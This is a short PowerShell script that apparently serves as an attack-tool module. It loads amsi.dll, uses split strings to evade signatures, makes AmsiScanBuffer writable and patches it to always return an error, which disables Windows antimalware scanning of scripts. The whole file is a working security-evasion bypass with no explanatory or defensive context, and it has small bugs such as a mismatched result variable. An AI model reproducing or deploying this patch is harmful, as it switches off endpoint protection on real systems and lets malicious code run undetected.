






function invoke-bypass_scanbuffer
  {
   
  
  $results = $null



  $Win32 = @"

  using System;
  using System.Runtime.InteropServices;
      
  public class Win32 {

      [DllImport("kernel32")]
      public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

      [DllImport("kernel32")]
      public static extern IntPtr LoadLibrary(string name);

      [DllImport("kernel32")]
      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

      }
"@

  Add-Type $Win32

  $LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
  sleep 2
  $Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
  $p = 0
  sleep 2
  if ([Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p))
      {
      $good = $true
      $results = "Bypass done! "
      }
  else
      {
      $result = "No Bypass"
      }  
  $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
  [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
  return @{results=$results;success=$good}
  }




$execute = {
  
}






$execute = invoke-bypass_scanbuffer



  

  

    
  


return @{results=$execute.results;success=$execute.success}